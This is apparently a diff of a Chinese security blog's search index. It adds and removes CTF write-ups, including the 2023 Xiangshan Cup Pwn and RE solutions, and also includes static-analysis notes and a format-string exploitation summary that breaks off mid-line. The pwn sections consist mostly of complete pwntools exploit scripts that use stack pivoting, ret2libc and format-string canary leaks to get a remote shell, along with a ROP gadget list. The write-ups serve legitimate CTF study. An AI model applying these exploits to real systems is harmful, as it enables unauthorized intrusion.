@@ -182,46 +182,6 @@ Q2：
       </tags>
   </entry>
   <entry>
-    <title>2023香山杯Pwn &amp; RE-wp</title>
-    <url>/2023/10/15/2023%E9%A6%99%E5%B1%B1%E6%9D%AFPwn%20&amp;%20RE-wp/</url>
-    <content><![CDATA[<blockquote class="blockquote-center">
-香山杯！Pwn ak + RE 差几分钟就xxTEA写完啦😭
-</blockquote>
-<span id="more"></span>
-<h1 id="re">RE</h1>
-<h3 id="url从哪儿来">url从哪儿来</h3>
-<p><img src="/pic/image-1.png" /></p>
-<p>断点下在这，知道他会在buffer指向的地址生成一个文件，让程序跑完，能看到这个文件
-<img src="/pic/image-2.png" />
-ida打开，因为它问url是什么，所以我们直接看szurl <img
-src="/pic/image-3.png" />
-结果这个不是flag，看到url问我们是如何解密的，所以我们回到上面那一堆数据里面，我们看一下v13
-<img src="/pic/image-4.png" /> flag就在这 <img
-src="/pic/image-5.png" /></p>
-<h1 id="pwn">Pwn</h1>
-<h3 id="move">Move</h3>
-<p>栈迁移到bss段的skdd，泄露puts，libcsearcher查到puts的libc是2.27，glibc-all-in-one下一个出来，然后返回main函数<br />
-在skdd里写system("/bin/sh")，本来是想再栈迁移一遍，结果发现直接do_system了，稍微修改了一下就getshell了
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp头 ---------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;59.110.125.41&#x27;</span></span><br><span class="line">port = <span class="number">45341</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line">bss_addr = <span class="number">0x4050A0</span></span><br><span class="line">lea_addr = <span class="number">0x4012E0</span></span><br><span class="line">junk = <span class="number">0x30</span></span><br><span class="line">pop_rdi = <span class="number">0x401353</span></span><br><span class="line">start_addr = <span class="number">0x401264</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;number&#x27;</span>,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈劫持 ---------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;a&#x27;</span>*junk + p64(bss_addr-<span class="number">8</span>) + p64(lea_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line"><span class="comment"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr  = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh    = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="comment"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># sh_addr = 0x402027</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line"><span class="comment"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line"><span class="comment"># io.sendafter(&#x27;number&#x27;,payloadload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span></span><br><span class="line"><span class="comment"># io.send(payloadload)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401350 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401352 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040119d : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401353 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401351 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="pwthon">Pwthon</h3>
-<p>Cpython pwn<br />
-核心逻辑在.so文件里，盲打试到有格式化字符串，测试出栈大小，泄露出必要的信息就能ret2libc了<br />
-gift泄露基地址和返回地址<br />
-格式化字符串泄露canary<br />
-通过puts泄露libc ret2libc <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;39.106.48.123&#x27;</span></span><br><span class="line">port = <span class="number">29572</span></span><br><span class="line"><span class="comment"># file = &#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;gift&#x27;</span>)</span><br><span class="line">gift = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">base = gift- <span class="number">0x68B0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift&#x27;</span>,gift)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%p-&#x27;</span>*<span class="number">31</span>+<span class="string">b&#x27;q%pq&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;q&#x27;</span>,drop=<span class="string">&#x27;Ture&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000003f8f</span> + base</span><br><span class="line">pop_rsi = <span class="number">0x0000000000003cd9</span> + base</span><br><span class="line">bss = <span class="number">0x016FC0</span>+<span class="number">0x100</span>+base</span><br><span class="line">read = <span class="number">0x3940</span>+base</span><br><span class="line">write = <span class="number">0x03760</span>+base</span><br><span class="line">op = <span class="number">0x3AE0</span>+base</span><br><span class="line">flag = <span class="number">0x000000000003c257</span>+base</span><br><span class="line">puts = <span class="number">0x3710</span>+base</span><br><span class="line">ret = <span class="number">0x000000000000301a</span>+base</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">33</span>+p64(canary)*<span class="number">2</span>+p64(pop_rdi)+p64(<span class="number">0x16078</span>+base)+p64(puts)+p64(base+<span class="number">0x99f0</span>)</span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;</span></span><br><span class="line">io.send(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len &quot;</span>,<span class="built_in">len</span>(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">32</span>+p64(canary)*<span class="number">3</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://localhost:4000/pic/imagexsb.png" /></p>
-]]></content>
-      <categories>
-        <category>CTF_practice</category>
-      </categories>
-      <tags>
-        <tag>WriteUp</tag>
-        <tag>Reverse</tag>
-        <tag>Pwn</tag>
-        <tag>Stack</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2023第七届蓝帽杯初赛Pwn-takeway-wp</title>
     <url>/2023/08/26/2023%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BPwn-takeway-wp/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
@@ -569,6 +529,67 @@ Explosion，有些地方也叫路径爆炸)的问题，来看下面这个循环
       </tags>
   </entry>
   <entry>
+    <title>2023香山杯Pwn &amp; RE-wp</title>
+    <url>/2023/10/15/2023%E9%A6%99%E5%B1%B1%E6%9D%AFPwn%20&amp;%20RE-wp/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+香山杯！Pwn ak + RE 差几分钟就xxTEA写完啦😭
+</blockquote>
+<span id="more"></span>
+<h1 id="re">RE</h1>
+<h3 id="url从哪儿来">url从哪儿来</h3>
+<p><img src="/pic/image-1.png" /></p>
+<p>断点下在这，知道他会在buffer指向的地址生成一个文件，让程序跑完，能看到这个文件
+<img src="/pic/image-2.png" />
+ida打开，因为它问url是什么，所以我们直接看szurl <img
+src="/pic/image-3.png" />
+结果这个不是flag，看到url问我们是如何解密的，所以我们回到上面那一堆数据里面，我们看一下v13
+<img src="/pic/image-4.png" /> flag就在这 <img
+src="/pic/image-5.png" /></p>
+<h1 id="pwn">Pwn</h1>
+<h3 id="move">Move</h3>
+<p>栈迁移到bss段的skdd，泄露puts，libcsearcher查到puts的libc是2.27，glibc-all-in-one下一个出来，然后返回main函数<br />
+在skdd里写system("/bin/sh")，本来是想再栈迁移一遍，结果发现直接do_system了，稍微修改了一下就getshell了
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp头 ---------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;59.110.125.41&#x27;</span></span><br><span class="line">port = <span class="number">45341</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line">bss_addr = <span class="number">0x4050A0</span></span><br><span class="line">lea_addr = <span class="number">0x4012E0</span></span><br><span class="line">junk = <span class="number">0x30</span></span><br><span class="line">pop_rdi = <span class="number">0x401353</span></span><br><span class="line">start_addr = <span class="number">0x401264</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;number&#x27;</span>,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈劫持 ---------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;a&#x27;</span>*junk + p64(bss_addr-<span class="number">8</span>) + p64(lea_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line"><span class="comment"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr  = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh    = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="comment"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># sh_addr = 0x402027</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line"><span class="comment"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line"><span class="comment"># io.sendafter(&#x27;number&#x27;,payloadload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span></span><br><span class="line"><span class="comment"># io.send(payloadload)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401350 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401352 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040119d : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401353 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401351 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="pwthon">Pwthon</h3>
+<p>Cpython pwn<br />
+核心逻辑在.so文件里，盲打试到有格式化字符串，测试出栈大小，泄露出必要的信息就能ret2libc了<br />
+gift泄露基地址和返回地址<br />
+格式化字符串泄露canary<br />
+通过puts泄露libc ret2libc <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;39.106.48.123&#x27;</span></span><br><span class="line">port = <span class="number">29572</span></span><br><span class="line"><span class="comment"># file = &#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;gift&#x27;</span>)</span><br><span class="line">gift = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">base = gift- <span class="number">0x68B0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift&#x27;</span>,gift)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%p-&#x27;</span>*<span class="number">31</span>+<span class="string">b&#x27;q%pq&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;q&#x27;</span>,drop=<span class="string">&#x27;Ture&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000003f8f</span> + base</span><br><span class="line">pop_rsi = <span class="number">0x0000000000003cd9</span> + base</span><br><span class="line">bss = <span class="number">0x016FC0</span>+<span class="number">0x100</span>+base</span><br><span class="line">read = <span class="number">0x3940</span>+base</span><br><span class="line">write = <span class="number">0x03760</span>+base</span><br><span class="line">op = <span class="number">0x3AE0</span>+base</span><br><span class="line">flag = <span class="number">0x000000000003c257</span>+base</span><br><span class="line">puts = <span class="number">0x3710</span>+base</span><br><span class="line">ret = <span class="number">0x000000000000301a</span>+base</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">33</span>+p64(canary)*<span class="number">2</span>+p64(pop_rdi)+p64(<span class="number">0x16078</span>+base)+p64(puts)+p64(base+<span class="number">0x99f0</span>)</span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;</span></span><br><span class="line">io.send(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len &quot;</span>,<span class="built_in">len</span>(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">32</span>+p64(canary)*<span class="number">3</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://localhost:4000/pic/imagexsb.png" /></p>
+]]></content>
+      <categories>
+        <category>CTF_practice</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+        <tag>Reverse</tag>
+        <tag>Pwn</tag>
+        <tag>Stack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NJU-static program analysis notes</title>
+    <url>/2024/01/30/NJU-static%20program%20analysis%20notes/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+南大软件分析笔记
+</blockquote>
+<span id="more"></span>
+<h1 id="intermediate-representation">Ⅱ Intermediate Representation</h1>
+<h2 id="compiler">Compiler</h2>
+<ol type="1">
+<li>编译步骤： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Source Code                --&gt; </span><br><span class="line">Lexical Analysis(词法分析)  --(token)--&gt; </span><br><span class="line">Syntax Analysis(语法分析)   --(AST)--&gt; </span><br><span class="line">Semantic Analysis(句法分析) --(Decorated AST)--&gt; </span><br><span class="line">Lifted   --(IR)--&gt; (主要在这一步进行静态分析)</span><br><span class="line">Code generate              --&gt; </span><br><span class="line">Machine Code</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>Software analysis technology</category>
+      </categories>
+      <tags>
+        <tag>Notes</tag>
+        <tag>Wifi</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>IOT — 某路由器mips固件解密脚本复现</title>
     <url>/2023/11/09/IOT%20%E2%80%94%20%E6%9F%90%E8%B7%AF%E7%94%B1%E5%99%A8mips%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
@@ -737,8 +758,8 @@ href="https://blog.csdn.net/duanxingheng/article/details/11730617">OpenSSL-AES</
         <category>IOT</category>
       </categories>
       <tags>
-        <tag>Mips</tag>
         <tag>Wifi</tag>
+        <tag>Mips</tag>
       </tags>
   </entry>
   <entry>
@@ -777,108 +798,78 @@ directory -&gt; how to read file in a formatted way</p></li>
       </tags>
   </entry>
   <entry>
-    <title>NJU-static program analysis notes</title>
-    <url>/2024/01/30/NJU-static%20program%20analysis%20notes/</url>
+    <title>Pwn - Format String Summary</title>
+    <url>/2024/01/21/Pwn%20-%20Format%20String%20Summary/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
-南大软件分析笔记
+总结一下格式化字符串漏洞，便于后续调用
 </blockquote>
 <span id="more"></span>
-<h1 id="intermediate-representation">Ⅱ Intermediate Representation</h1>
-<h2 id="compiler">Compiler</h2>
+<h1 id="原理-工具">原理 &amp; 工具</h1>
+<h2 id="原理">原理</h2>
+<blockquote>
+<p>本质是利用 printf(string) 任意地址读写</p>
+</blockquote>
+<blockquote>
+<p>记录一下常用的格式</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt    :        标准作用       ||           常用方式</span><br><span class="line">——————————————————————————————————————————————————————————————</span><br><span class="line">%p     :     输出栈上的内容     |  (读) 找偏移\pie_base\canary</span><br><span class="line">%s     :   输出地址指向的内容   ||     (读) 泄露libc_base</span><br><span class="line">%hhn   :   修改地址指向的byte   |        (写) 任意地址写</span><br><span class="line">%hn/%n : 修改地址指向的2/4bytes |        (写) 任意地址写</span><br></pre></td></tr></table></figure>
+<h2 id="工具-pwntools---fmtstr_payload">工具: Pwntools -
+fmtstr_payload</h2>
+<p><a href="https://docs.pwntools.com/en/stable/fmtstr.html">Pwntools -
+class fmtstr</a></p>
+<blockquote>
+<p>源码见上述链接或文章末尾的 Appendix</p>
+</blockquote>
+<p>fmtstr是一个类，我们只需要用其中的 fmtstr_payload 来构造我们的
+payload 即可。现在版本的 pwntools 已经支持 64 位的 格式化字符串 payload
+生成了。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default: numbwritten=0 , write_size=<span class="string">&#x27;byte&#x27;</span></span></span><br><span class="line">payload = fmtstr_payload(offset, writes, numbwritten=, write_size=&#x27;&#x27;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Example:</span></span><br><span class="line">context.clear(arch = &#x27;amd64&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span 